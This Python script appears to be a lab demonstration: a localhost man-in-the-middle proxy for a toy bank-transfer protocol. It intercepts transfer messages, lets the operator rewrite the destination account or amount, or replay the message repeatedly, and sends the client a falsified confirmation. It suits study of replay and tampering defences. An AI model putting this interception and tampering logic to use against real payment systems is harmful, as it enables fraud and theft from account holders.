import socket
import threading
import signal, sys, time

HOST = '127.0.0.1'
MITM_PORT = 1233
SERVER_PORT = 1234

def signal_handler(key, frame):
	print("\n\n[!] Exiting...\n")
	sys.exit(1)

signal = signal.signal(signal.SIGINT, signal_handler)

def threaded_client(connection):

    connection.send(str.encode('\n[+] Connection successful'))
    key = connection.recv(1024)
    message = connection.recv(2048)
    print("[↓] Captured message [↓]")
    message_dec=message.decode()
    print(message_dec + "\n")
    print("[↓] Message breakdown [↓]")
    print("From: " + str(message_dec).split(":")[0])
    print("To: " + str(message_dec).split(":")[1])
    print("Amount: " + str(message_dec).split(":")[2] +"\n")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, SERVER_PORT))
    server.send(key)
    attack_option = input("\n[+] What attack do you wanna do? (1: Replay attack - 2: MITM attack): ")

    #---------ATTACK INIT-----------#

    # MITM ATTACK

    if(attack_option=="2"):
        field=input("\n[+] Select the field you want to change (1: Destination account - 2: Amount - 3: Both): ")
        if(field=="1"):
            new_destination=input("\nInsert new destination account: ")
            print("To: " + str(message_dec).split(":")[1]+ " ➝ " + new_destination)
            new_message=str(message_dec).split(":")[0] + ":" + new_destination + ":" + str(message_dec).split(":")[2] + ":" + str(message_dec).split(":")[3]+ ":" + str(message_dec).split(":")[4] + ":" + str(message_dec).split(":")[5]
            print("New message: " + new_message)
            server.send(str.encode(new_message))
            time.sleep(0.1)
            response = server.recv(2048)
            print("\n[↓] Server Response [↓] ")
            print(response.decode())
        elif(field=="2"):
            new_amount=input("\nInsert new amount: ")
            print("Amount: " + str(message_dec).split(":")[2]+ " ➝ " + new_amount)
            new_message=str(message_dec).split(":")[0] + ":" + str(message_dec).split(":")[1] + ":" + new_amount + ":" + str(message_dec).split(":")[3]+ ":" +str(message_dec).split(":")[4] + ":" + str(message_dec).split(":")[5]
            print("New message: " + new_message)
            server.send(str.encode(new_message))
            time.sleep(1)
            response = server.recv(2048)
            print("\n[↓] Server Response [↓] ")
            print(response.decode())
        else:
            new_destination=input("\nInsert new destination account: ")
            new_amount=input("\nInsert new amount: ")
            print("To: " + str(message_dec).split(":")[1]+ " ➝ " + new_destination)
            print("Amount: " + str(message_dec).split(":")[2]+ " ➝ " + new_amount)
            new_message=str(message_dec).split(":")[0] + ":" + new_destination + ":" + new_amount + ":" + str(message_dec).split(":")[3]+ ":" +str(message_dec).split(":")[4] + ":" + str(message_dec).split(":")[5]
            print("New message: " + new_message)
            server.send(str.encode(new_message))
            time.sleep(1)
            response = server.recv(2048)
            print("\n[↓] Server Response [↓] ")
            print(response.decode())
        
        connection.send(str.encode('\n[+] It will be transfered {} from {} to {} in 2-3 working days. Thanks for your patience.\nYour transfer id is: 00000-00000\n'.format(
            str(message_dec).split(":")[2], str(message_dec).split(":")[0], str(message_dec).split(":")[1])))

    # REPLAY ATTACK

    elif(attack_option=="1"):
        n_replay=input("\nHow many requests do you wanna make: ")        
        server.send(message)
        response = server.recv(2048)
        connection.send(response)
        for _ in range(int(n_replay)):
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((HOST, SERVER_PORT))
            server.send(key)
            time.sleep(1)
            server.send(message)
            time.sleep(0.5)
            response = server.recv(2048)
            print("\n[↓] Server Response {} [↓]".format(_+1))
            print(response.decode())
        sys.exit(0)
        
    else:
        print("\n[!] Select a valid attack option")


if __name__=='__main__':

    ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        ServerSocket.bind((HOST, MITM_PORT))
    except socket.error as e:
        print(str(e))

    print('\n[+] Waiting for client connection...')
    ServerSocket.listen(5)
    
    while True:
        client, address = ServerSocket.accept()
        client_handler = threading.Thread(
            target=threaded_client,
            args=(client,)  
        )
        client_handler.start()
        print('\n[+] Connection received.\n')
